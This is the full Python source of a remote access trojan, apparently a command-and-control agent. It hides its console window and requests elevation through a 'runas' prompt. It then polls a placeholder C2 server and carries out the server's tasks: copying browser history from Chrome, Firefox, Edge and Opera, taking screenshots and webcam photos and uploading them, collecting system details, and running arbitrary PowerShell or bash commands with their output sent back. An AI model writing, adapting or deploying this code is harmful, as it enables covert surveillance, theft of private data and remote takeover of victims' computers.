import os
import platform
import ctypes
import sys
import time
import requests
import subprocess
import socket
import threading
import logging
from threading import local
import psutil
import cv2
from datetime import datetime
from PIL import ImageGrab
import sqlite3
import shutil


thread_data = local()
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('C2Agent')


C2_SERVER = "http://server_ip:port"
AGENT_ID = None
HEARTBEAT_INTERVAL = 2
MAX_RETRIES = 5
RETRY_DELAY = 10


thread_data.cwd = os.getcwd()



def get_browser_paths():
    
    current_os = platform.system().lower()
    paths = {
        'chrome': {
            'windows': os.path.join(
                os.getenv("LOCALAPPDATA", ""),
                'Google', 'Chrome', 'User Data', 'Default', 'History'
            ),
            'mac': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History'),
            'linux': [
                os.path.expanduser('~/.config/google-chrome/Default/History'),
                os.path.expanduser('~/.config/chromium/Default/History')
            ]
        },
        'firefox': {
            'windows': os.path.join(
                os.getenv("APPDATA", ""),
                'Mozilla', 'Firefox', 'Profiles'
            ),
            'mac': os.path.expanduser('~/Library/Application Support/Firefox/Profiles'),
            'linux': os.path.expanduser('~/.mozilla/firefox')
        },
        'edge': {
            'windows': os.path.join(
                os.getenv("LOCALAPPDATA", ""),
                'Microsoft', 'Edge', 'User Data', 'Default', 'History'
            ),
            'mac': os.path.expanduser('~/Library/Application Support/Microsoft Edge/Default/History'),
            'linux': os.path.expanduser('~/.config/microsoft-edge/Default/History')
        },
        'opera': {
            'windows': os.path.join(
                os.getenv("APPDATA", ""),
                'Opera Software', 'Opera Stable', 'History'
            ),
            'mac': os.path.expanduser('~/Library/Application Support/com.operasoftware.Opera/History'),
            'linux': [
                os.path.expanduser('~/.config/opera/History'),
                os.path.expanduser('~/.config/opera-beta/History')
            ]
        }
    }
    return {browser: paths[browser][current_os] for browser in paths}

BROWSER_PATHS = get_browser_paths()

def hide_console():
    if platform.system() == 'Windows':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def register():
    """Register agent with C2 server"""
    global AGENT_ID
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.post(
                f"{C2_SERVER}/register",
                json={'os': platform.system()},
                timeout=10
            )
            if response.status_code == 200:
                AGENT_ID = response.json()['id']
                logger.info(f"Registered as {AGENT_ID}")
                return True
            logger.warning(f"Registration failed: {response.status_code}")
        except Exception as e:
            logger.error(f"Registration attempt {attempt+1} failed: {str(e)}")
        time.sleep(RETRY_DELAY)
    return False

def find_browser_path(browser):
    """Locate browser history file with fallback paths"""
    paths = BROWSER_PATHS.get(browser, [])
    if not isinstance(paths, list):
        paths = [paths]
    
    for path in paths:
        if browser == 'firefox' and platform.system().lower() != 'windows':
            try:
                profiles = [d for d in os.listdir(path) if d.endswith('.default-release')]
                if profiles:
                    profile_path = os.path.join(path, profiles[0], 'places.sqlite')
                    if os.path.exists(profile_path):
                        return profile_path
            except FileNotFoundError:
                continue
        elif os.path.exists(path):
            return path
    return None

def fetch_browser_history(browser):
    """Fetch browser history with proper locking and temp file handling"""
    try:
        path = find_browser_path(browser)
        if not path:
            return f"⚠️ {browser.capitalize()} not installed or unsupported platform"
        
        
        temp_dir = os.getenv('TEMP') if platform.system() == 'Windows' else '/tmp'
        temp_db = os.path.join(temp_dir, f'{browser}_history_{os.getpid()}.tmp')
        
        try:
            shutil.copy2(path, temp_db)
        except Exception as e:
            return f"❌ Error accessing {browser} history: {str(e)}"
        
        history = []
        try:
            conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
            cursor = conn.cursor()
            
            query = '''
                SELECT url, title, visit_count, last_visit_time FROM urls
                ORDER BY last_visit_time DESC LIMIT 100
            ''' if browser != 'firefox' else '''
                SELECT url, title, visit_count, last_visit_date FROM moz_places
                ORDER BY last_visit_date DESC LIMIT 100
            '''
            
            cursor.execute(query)
            
            for row in cursor.fetchall():
                timestamp = row[3]/1000000 - 11644473600 if browser != 'firefox' else row[3]/1000
                history.append({
                    'url': row[0],
                    'title': row[1] or 'No Title',
                    'visits': row[2],
                    'last_visited': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
                })
                
        except sqlite3.OperationalError as e:
            return f"❌ Database error: {str(e)}"
        finally:
            conn.close()
            os.remove(temp_db)
            
        return history if history else f"⚠️ No history found in {browser.capitalize()}"
        
    except Exception as e:
        return f"❌ Unexpected error: {str(e)}"

def format_browser_history():
    """Format browser history for clear output"""
    results = []
    for browser in BROWSER_PATHS.keys():
        data = fetch_browser_history(browser)
        if isinstance(data, str):
            results.append(f"=== {browser.upper()} ===\n{data}")
            continue
            
        entries = [
            f"=== {browser.upper()} ===\nFound {len(data)} recent entries:"
        ]
        for idx, item in enumerate(data, 1):
            entries.append(
                f"{idx}. {item['title']}\n"
                f"   URL: {item['url']}\n"
                f"   Visits: {item['visits']} | Last Visited: {item['last_visited']}"
            )
        results.append("\n".join(entries))
    
    return "\n\n".join(results)

def execute_task(task):
    """Execute received task and return formatted result"""
    try:
        
        if task.lower() == "browser_history":
            return format_browser_history()
            
        if task.lower() == "screenshot":
            img = ImageGrab.grab()
            filename = f"screenshot_{AGENT_ID}_{int(time.time())}.png"
            img.save(filename)
            with open(filename, 'rb') as f:
                requests.post(f"{C2_SERVER}/upload/{AGENT_ID}", files={'file': (filename, f)})
            os.remove(filename)
            return f"📸 Screenshot uploaded: {filename}"
            
        if task.lower() == "sysinfo":
            info = [
                f"OS: {platform.platform()}",
                f"Hostname: {socket.gethostname()}",
                f"Username: {os.getlogin()}",
                f"Local IP: {socket.gethostbyname(socket.gethostname())}",
                f"CPU Cores: {psutil.cpu_count(logical=False)} ({psutil.cpu_count()} logical)",
                f"Total RAM: {psutil.virtual_memory().total / (1024**3):.1f} GB",
                f"Disk Usage: {psutil.disk_usage('/').percent}%"
            ]
            return "\n".join(info)

        if task.lower() == "webcam_capture":
            if cv2 is None:
                return "❌ OpenCV is required for webcam access"
            
            
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return "❌ Could not access webcam"
            
            
            ret, frame = cap.read()
            cap.release()  
            
            if not ret:
                return "❌ Failed to capture frame"
            
            
            filename = f"webcam_{AGENT_ID}_{int(time.time())}.jpg"
            cv2.imwrite(filename, frame)
            
            try:
                with open(filename, 'rb') as f:
                    requests.post(
                        f"{C2_SERVER}/upload/{AGENT_ID}",
                        files={'file': (filename, f)},
                        timeout=15
                    )
            finally:
                os.remove(filename)
            
            return f"📷 Webcam image uploaded: {filename}"
            
        if task.lower() == "public_ip":
            services = ['https://api.ipify.org', 'https://ipinfo.io/ip']
            for service in services:
                try:
                    return f"Public IP: {requests.get(service, timeout=5).text.strip()}"
                except:
                    continue
            return "❌ Could not determine public IP"

        
        if task.lower().startswith('cd '):
            new_dir = task[3:].strip()
            if not os.path.isabs(new_dir):
                new_dir = os.path.join(thread_data.cwd, new_dir)
            new_dir = os.path.normpath(new_dir)
            if not os.path.isdir(new_dir):
                return f"Directory not found: {new_dir}"
            thread_data.cwd = new_dir
            return f"Changed directory to {thread_data.cwd}"

        
        if platform.system() == 'Windows':
            shell_cmd = ['powershell.exe', '-Command', task]
        else:
            shell_cmd = ['/bin/bash', '-c', task]

        result = subprocess.run(
            shell_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=15,
            cwd=thread_data.cwd,
            creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == 'Windows' else 0
        )
        output = result.stdout.strip() or result.stderr.strip()
        return output if output else "✅ Command executed successfully"

    except Exception as e:
        return f"❌ Error: {str(e)}"

def main_loop():
    
    while True:
        try:
            response = requests.post(
                f"{C2_SERVER}/heartbeat/{AGENT_ID}",
                timeout=10
            ).json()

            if 'tasks' in response:
                for task in response['tasks']:
                    result = execute_task(task)
                    requests.post(
                        f"{C2_SERVER}/results/{AGENT_ID}",
                        json={
                            'command': task,
                            'result': result,
                            'timestamp': datetime.now().isoformat(),
                            'type': 'result'
                        }
                    )

            time.sleep(HEARTBEAT_INTERVAL)
            
        except Exception as e:
            logger.error(f"Heartbeat error: {str(e)}")
            time.sleep(RETRY_DELAY)

if __name__ == '__main__':
    hide_console()
    
    
    if platform.system() == 'Windows' and not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
        
    if register():
        logger.info("Agent started in background")
        main_loop()
    else:
        logger.error("Failed to register with C2 server")